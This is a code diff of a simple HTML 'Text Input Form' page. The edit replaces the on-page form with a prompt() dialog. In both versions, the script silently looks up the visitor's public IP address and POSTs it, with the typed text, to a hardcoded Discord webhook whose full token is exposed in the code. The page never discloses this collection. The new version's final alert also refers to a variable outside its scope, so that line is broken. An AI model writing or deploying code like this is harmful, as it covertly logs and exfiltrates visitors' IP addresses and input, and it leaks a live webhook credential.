@@ -4,49 +4,33 @@
   <title>Text Input Form</title>
 </head>
 <body>
-  <h1>Text Input Form</h1>
-  <form id="form" method="POST">
-    <label for="text">Enter some text:</label><br>
-    <input type="text" id="text" name="text"><br>
-    <input type="submit" value="Submit">
-  </form> 
-  <div id="response" class="response"></div>
   <script>
-    // Get the form and response elements
-    const form = document.getElementById('form');
-    const response = document.getElementById('response');
+    // Prompt the user for some text
+    const text = prompt('Enter some text:');
 
-    // Handle form submission
-    form.addEventListener('submit', (event) => {
-      event.preventDefault();
+    // Get the user's IP address
+    fetch('https://api.ipify.org?format=json')
+      .then((response) => response.json())
+      .then((data) => {
+        const ip = data.ip;
+        console.log(`Text: ${text}`);
+        console.log(`IP address: ${ip}`);
 
-      // Get the text input value
-      const text = document.getElementById('text').value;
-
-      // Get the user's IP address
-      fetch('https://api.ipify.org?format=json')
-        .then((response) => response.json())
-        .then((data) => {
-          const ip = data.ip;
-          console.log(`Text: ${text}`);
-          console.log(`IP address: ${ip}`);
-
-          // Send the IP address and text to the Discord webhook
-          return fetch('https://discord.com/api/webhooks/1053303789194588180/uOwiXrahinkCIEmIczYdnp_0UF6-wS1Ti4QEylihBB-yac4C2KeNUDK6h-XyQWC1Mv-S', {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-              content: `Text: ${text}\nIP address: ${ip}`
-            })
-          });
-        })
-        .then((res) => {
-          // Display the response code
-          response.textContent = `Response code: ${res.status}`;
+        // Send the IP address and text to the Discord webhook
+        return fetch('https://discord.com/api/webhooks/1053303789194588180/uOwiXrahinkCIEmIczYdnp_0UF6-wS1Ti4QEylihBB-yac4C2KeNUDK6h-XyQWC1Mv-S', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            content: `Text: ${text}\nIP address: ${ip}`
+          })
         });
-    });
+      })
+      .then((res) => {
+        // Display an alert with the response code and IP address
+        alert(`Response code: ${res.status}\nIP address: ${ip}`);
+      });
   </script>
 </body>
 </html>
